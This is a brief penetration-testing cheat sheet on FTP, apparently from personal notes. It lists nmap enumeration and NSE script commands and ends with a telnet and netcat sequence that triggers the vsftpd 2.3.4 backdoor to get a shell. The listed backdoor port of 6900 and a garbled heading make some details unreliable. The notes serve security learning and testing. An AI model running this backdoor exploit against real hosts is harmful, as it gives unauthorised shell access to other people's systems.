---
description: TCP/21
---

# FTP

### Enumerating with nmap

```bash
nmap -v -n -Pn -sT -p 21 --open --oA report_ftp $range
grep open report_ftp.gnmap | cut -d" " -f2 > hosts_ftp.txt
```

## Enumeration with NSEnmap scansnmap scripts

```bash
#check for anonymous
nmap -v -p 21 --script=ftp-anon.nse $ip-254

nmap -sT -p 21 -v -n -Pn --script ftp-bounce $ip
```

### VSFTPD

version 2.3.4 is vulnerable

```bash
telnet $ip 21
USER someone: )
PASS nothing
ctrl+[

nc $ip 6900
```

